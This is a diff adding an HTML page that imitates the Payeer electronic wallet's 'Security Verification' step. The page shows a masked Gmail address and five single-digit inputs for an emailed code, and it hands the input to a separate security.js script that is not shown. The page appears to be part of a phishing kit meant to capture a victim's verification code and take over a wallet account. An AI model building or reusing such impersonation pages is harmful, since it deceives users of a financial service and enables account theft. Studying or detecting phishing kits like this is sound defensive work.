@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Payeer Security Verification</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="/style.css">
+  </head>
+  <body>
+    <div id="app">
+      <div class="payeer-container">
+        <!-- Header with logo -->
+        <header class="payeer-header">
+          <div class="logo-container">
+            <h1 class="logo">PAYEER<span class="registered">®</span></h1>
+            <p class="subtitle">ELECTRONIC WALLET</p>
+          </div>
+        </header>
+
+        <!-- Main content -->
+        <main class="payeer-main">
+          <div class="auth-container">
+            <div class="auth-header">
+              <h2 class="auth-title">AUTHENTICATION</h2>
+              <div class="green-line"></div>
+            </div>
+            
+            <h1 class="login-title">Security</h1>
+            
+            <div class="login-form-container">
+              <div class="security-form">
+                <div class="back-close-buttons">
+                  <button class="btn-circle" id="backButton">
+                    <i class="bi bi-arrow-left"></i>
+                  </button>
+                  <button class="btn-circle" id="closeButton">
+                    <i class="bi bi-x"></i>
+                  </button>
+                </div>
+                
+                <h2 class="verification-title">Enter the verification code</h2>
+                
+                <p class="verification-message">
+                  Code has been sent to e-mail<br>
+                  <span class="masked-email">moq**********cial@gmail.com</span>
+                </p>
+                
+                <div class="verification-code-container">
+                  <input type="text" maxlength="1" class="verification-input" autofocus>
+                  <input type="text" maxlength="1" class="verification-input">
+                  <input type="text" maxlength="1" class="verification-input">
+                  <input type="text" maxlength="1" class="verification-input">
+                  <input type="text" maxlength="1" class="verification-input">
+                </div>
+                
+                <button type="button" class="btn btn-login">Go next</button>
+                
+                <p class="resend-text">
+                  Didn't you received the code? <a href="#" class="resend-link">Resend</a>
+                </p>
+              </div>
+            </div>
+            
+            <div class="create-account-container">
+              <p class="create-account-text">Don't have an account?</p>
+              <a href="#" class="btn-create">
+                <i class="bi bi-person-plus-fill"></i> CREATE
+              </a>
+            </div>
+          </div>
+        </main>
+      </div>
+    </div>
+    <script type="module" src="/security.js"></script>
+  </body>
+</html>
